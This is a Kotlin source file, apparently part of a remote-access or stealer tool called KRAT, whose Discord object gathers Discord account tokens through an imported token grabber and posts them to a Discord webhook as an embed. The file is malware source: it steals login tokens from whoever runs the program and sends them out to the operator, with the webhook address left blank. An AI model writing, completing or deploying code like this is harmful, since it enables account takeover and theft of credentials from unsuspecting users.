package services

import KRAT.user
import services.discord.TokenGrabber.getTokens
import utils.DiscordWebhook
import utils.ListUtils.removeDuplicates

object Discord {
    fun webhook(): DiscordWebhook {
        return DiscordWebhook("").apply {
            username = user
        }
    }

    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates()
        if (tokens == null || tokens.isEmpty()) return
        val sIf = if (tokens.size > 1) "s" else ""

        webhook().apply {
            embeds.add(
                DiscordWebhook.EmbedObject()
                    .setTitle("Discord token$sIf detected")
                    .setDescription("**Token$sIf:** ${tokens.map { "```$it```" }.joinToString()}")
            )
            execute()
        }

        // TODO: send via discord bot
    }
}